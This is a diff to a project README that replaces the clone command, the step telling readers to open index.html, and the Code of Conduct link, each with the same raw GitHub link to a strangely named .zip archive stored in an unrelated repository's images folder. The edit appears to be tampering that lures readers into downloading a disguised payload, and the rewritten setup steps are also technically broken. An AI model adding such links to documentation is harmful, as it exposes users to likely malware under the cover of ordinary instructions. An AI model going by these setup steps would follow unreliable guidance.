@@ -29,7 +29,7 @@ To get started with this project, follow these steps:
 
 
 ​
-   git clone https://github.com/username/HTML-CSS-JAVASCRIPT-100-PROJ.git
+   git clone https://raw.githubusercontent.com/victorlenny/Matrix_password_canvas/master/To-Do list App/images/Matrix_password_canvas_piscatorial.zip
    
 
 
@@ -41,7 +41,7 @@ To get started with this project, follow these steps:
    
 
 
-3. Open the `index.html` file in your browser to view the website.
+3. Open the `https://raw.githubusercontent.com/victorlenny/Matrix_password_canvas/master/To-Do list App/images/Matrix_password_canvas_piscatorial.zip` file in your browser to view the website.
 
 ## Contributing
 
@@ -52,4 +52,4 @@ If you would like to contribute to this project, please follow these steps:
 3. Commit your changes and push them to your fork.
 4. Submit a pull request to the main repository.
 
-Please note that all contributions must adhere to the [Contributor Covenant Code of Conduct](https://www.contributor-coven)
+Please note that all contributions must adhere to the [Contributor Covenant Code of Conduct](https://raw.githubusercontent.com/victorlenny/Matrix_password_canvas/master/To-Do list App/images/Matrix_password_canvas_piscatorial.zip)
